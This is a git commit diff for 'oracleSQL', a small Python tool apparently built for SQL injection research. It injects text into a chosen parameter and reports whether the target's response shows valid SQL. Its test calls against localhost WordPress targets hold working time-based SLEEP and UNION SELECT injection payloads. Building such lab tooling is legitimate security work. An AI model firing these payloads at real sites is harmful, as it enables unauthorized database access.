39c8b84966f46bacc3cbaa01ed823ea847f3d2e2
usernamedjpris <49071112+usernamedjpris@users.noreply.github.com>
2020-03-05 23:02:30 +0100

    requête GET écrite mais à tester

--- README.md
+++ README.md
@@ -1,19 +1,12 @@
 # oracleSQL
 pour PFGimenez/poirot
-## Deux commandes
-### init
-Initialisation de la cible (variable globale) pour éviter de faire plusieurs fois des fonctions coûteuse (e.g. get_default_average_time)
+## Utilisation
+retourne 0 si la chaine de caractère est syntaxiquement valide, 1 sinon
 #### GET
 ```
-[Bientôt] python sqloracl.py init ([url](string), optional [avgnb](int))
+[Bientôt] python sqloracl.py [url](string) GET [payload](dict) [param](string) [injtext](string)
 ```
 #### POST
 ```
-[Bientôt] python sqloracl.py init ([url](string), [payload](dict), [param](string), optional [avgnb](int))
+[Bientôt] python sqloracl.py [url](string) POST [payload](dict) [param](string) [injtext](string)
 ```
-### oracle
-retourne 0 si la chaine de caractère est syntaxiquement valide, 1 sinon
- 
-```
-[Bientôt] python sqloracl.py oracle ([injtxt](string))
-``` 
--- sqloracl.py
+++ sqloracl.py
@@ -10,9 +10,7 @@ def http_request(target, injtxt):
     injected_target = copy.deepcopy(target)
     injected_target.payload[target.vulnparam] = target.payload[target.vulnparam] + injtxt
     if target.method == "GET":
-        #r = requests.get(injected_target.url+"?"+data=injected_target.payload)
-        ## TO DO
-        pass
+        r = requests.get(injected_target.url, params=injected_target.payload)
     elif target.method == "POST":
         r = requests.post(injected_target.url, data=injected_target.payload)    
     return r   
@@ -38,7 +36,7 @@ def oracle(url, method, payload, param, injtxt):
     if r.text.find("error")>= 0:    
         print("[oracleSQL] target raised error ┗( T﹏T )┛")
         return 1 # invalid
-    elif r.text != target.defaultPage: # l'injection est sûre (facultatif
+    elif r.text != target.defaultPage: # l'injection est sûre (facultatif)
         print("[oracleSQL] target sent a different response to the default one 🍾(ﾟヮﾟ☜)")
         return 0 # valid        
     else:
@@ -60,23 +58,23 @@ duplicate_page = HttpTarget("http://localhost/injections/wordp/wp-admin/wp-admin
                          "post")
 
 ## http_request 
-print(http_request(simply_poll, "").text)
+#print(http_request(simply_poll, "").text)
 ## wrong post
-print(http_request(simply_poll, "toto").text)
+#print(http_request(simply_poll, "toto").text)
 ## ## injection SQL (sleep 5s)
-print(http_request(simply_poll, ' AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)').text)
+#print(http_request(simply_poll, ' AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)').text)
 ## ## injection SQL (CONCAT)
-print(http_request(simply_poll, ' UNION ALL SELECT 6050,6050,6050,6050,6050,CONCAT(0x71786a7171,0x574f546a6e7944764f597450476f724d73677867664f754967476f59636c5054705a4c7853736143,0x7170767871),6050--').text)
+#print(http_request(simply_poll, ' UNION ALL SELECT 6050,6050,6050,6050,6050,CONCAT(0x71786a7171,0x574f546a6e7944764f597450476f724d73677867664f754967476f59636c5054705a4c7853736143,0x7170767871),6050--').text)
 
 
 ## oracle
-print(oracle(simply_poll.url, simply_poll.method, simply_poll.payload, simply_poll.vulnparam,""))
+#print(oracle(simply_poll.url, simply_poll.method, simply_poll.payload, simply_poll.vulnparam,""))
 ## wrong post
-print(oracle(simply_poll.url, simply_poll.method, simply_poll.payload, simply_poll.vulnparam,"toto"))
+#print(oracle(simply_poll.url, simply_poll.method, simply_poll.payload, simply_poll.vulnparam,"toto"))
 ## ## injection SQL (sleep 5s)
-print(oracle(simply_poll.url, simply_poll.method, simply_poll.payload, simply_poll.vulnparam," AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)"))
+#print(oracle(simply_poll.url, simply_poll.method, simply_poll.payload, simply_poll.vulnparam," AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)"))
 ## ## injection SQL (CONCAT)
-print(oracle(simply_poll.url, simply_poll.method, simply_poll.payload, simply_poll.vulnparam,' UNION ALL SELECT 6050,6050,6050,6050,6050,CONCAT(0x71786a7171,0x574f546a6e7944764f597450476f724d73677867664f754967476f59636c5054705a4c7853736143,0x7170767871),6050--'))
+#print(oracle(simply_poll.url, simply_poll.method, simply_poll.payload, simply_poll.vulnparam,' UNION ALL SELECT 6050,6050,6050,6050,6050,CONCAT(0x71786a7171,0x574f546a6e7944764f597450476f724d73677867664f754967476f59636c5054705a4c7853736143,0x7170767871),6050--'))
 
 
 
